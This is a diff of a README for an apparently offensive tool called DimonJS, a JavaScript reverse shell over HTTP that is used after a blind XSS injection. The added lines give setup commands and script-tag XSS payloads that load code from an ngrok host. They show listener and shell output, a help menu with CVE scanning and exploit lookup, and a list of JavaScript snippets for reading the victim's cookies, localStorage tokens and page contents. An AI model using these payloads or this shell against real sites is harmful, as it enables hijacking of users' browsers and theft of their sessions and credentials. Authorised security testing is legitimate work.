@@ -1,10 +1,127 @@
 # Description
- A reverse shell in JavaScript using WebSockets used to confirm blind XSS vulnerabilities and a tool for post-exploitation.
+ A reverse shell in JavaScript using HTTP to communicate, used to confirm blind XSS vulnerabilities and a tool for browser post-exploitation.
 # Setup and Use
-`pip install websockets asyncio`
-Then, you need to change your server's IP in the file `server.py`, and in the file `client.html` and upload it to the target server. To test locally, simply open it in your browser.
-To run the server, open a terminal window and type:
-`python server.py`
+``pip install pyngrok socketserver``
+
+Then, run in terminal or cmd:
+
+``python server.py``
+
+Now, run the JavaScript XSS payload on the target (Or simply open the HTML payload in the browser).
+
+````
+  ____  _                       ____      _ ____  
+ |  _ \(_)_ __ ___   ___  _ __ |  _ \    | / ___|
+ | | | | | '_ ` _ \ / _ \| '_ \| | | |_  | \___ \
+ | |_| | | | | | | | (_) | | | | |_| | |_| |___) |
+ |____/|_|_| |_| |_|\___/|_| |_|____/ \___/|____/  v1.3
+
+ <------------ Developed by DimonDev ------------>
+
+
+[!] Execute one of these payloads on the target:
+
+Local target:
+
+<script src="http://localhost:6969/?command=get_script"></script>
+The HTML payload: http://localhost:6969/?command=get_html
+
+Remote target:
+
+<script src="https://aaaabbbbcccc.ngrok-free.app/?command=get_script"></script>
+The HTML payload: https://aaaabbbbcccc.ngrok-free.app
+
+[+] Listener server started over WAN - https://aaaabbbbcccc.ngrok-free.app
+[+] Listening on port 6969
+````
+
+When a the target is connected, it will spawn a reverse HTTP shell (type command help):
+
+````
+  ____  _                       ____      _ ____  
+ |  _ \(_)_ __ ___   ___  _ __ |  _ \    | / ___|
+ | | | | | '_ ` _ \ / _ \| '_ \| | | |_  | \___ \
+ | |_| | | | | | | | (_) | | | | |_| | |_| |___) |
+ |____/|_|_| |_| |_|\___/|_| |_|____/ \___/|____/  v1.3
+
+ <------------ Developed by DimonDev ------------>
+
+
+[!] Execute one of these payloads on the target:
+
+Local target:
+
+<script src="http://localhost:6969/?command=get_script"></script>
+The HTML payload: http://localhost:6969/?command=get_html
+
+Remote target:
+
+<script src="https://aaaabbbbcccc.ngrok-free.app/?command=get_script"></script>
+The HTML payload: https://aaaabbbbcccc.ngrok-free.app
+
+[+] Listener server started over WAN - https://aaaabbbbcccc.ngrok-free.app
+[+] Listening on port 6969
+
+127.0.0.1 - - [03/May/2023 23:47:55] "GET /?command=get_script HTTP/1.1" 200 -
+127.0.0.1~# 
+127.0.0.1 - - [03/May/2023 23:47:55] "GET /shell HTTP/1.1" 200 -
+127.0.0.1 - - [03/May/2023 23:47:56] code 404, message Not Found
+127.0.0.1 - - [03/May/2023 23:47:56] "GET /favicon.ico HTTP/1.1" 404 -
+
+undefined
+
+127.0.0.1~#
+127.0.0.1 - - [03/May/2023 23:47:56] "GET /shell?resp=undefined HTTP/1.1" 200 -
+127.0.0.1~# 
+127.0.0.1 - - [03/May/2023 23:47:56] "GET /shell HTTP/1.1" 200 -
+
+undefined
+
+127.0.0.1~#
+127.0.0.1 - - [03/May/2023 23:47:57] "GET /shell?resp=undefined HTTP/1.1" 200 -
+127.0.0.1~# 
+127.0.0.1 - - [03/May/2023 23:47:58] "GET /shell HTTP/1.1" 200 -
+
+undefined
+
+127.0.0.1~# help
+
+---------------------------------------------------------
+Usage:
+    You can either input a Javascript snippet or use
+    the internal commands.
+
+Commands:
+    help - Prints this message.
+    getip - Fetches the public IP of the target.
+    vulnscan - Scans for possible CVEs in the target
+                browser.
+    info CVE-0000-0000 - Information about a CVE.
+    exploit CVE-0000-0000 - (For now, it only prints
+                                exploit-db url)
+
+Useful JavaScript:
+    document.documentURI
+    document.location
+    document.domain
+    document.body.innerHTML
+    document.head.innerHTML
+    document.cookie
+    localStorage
+    localStorage.getItem("SOME_ITEM_OR_TOKEN")
+    navigator.userAgent
+    navigator.platform
+    navigator.vibrate()
+    navigator.javaEnabled()
+    navigator.languages
+    navigator.maxTouchPoints
+    navigator.buildID
+
+----------------- Developed by DimonDev -----------------
+
+127.0.0.1~#
+````
+
 # Post-exploitation
 You can now use the JavaScript console remotely.
 Here are some interesting commands to use:
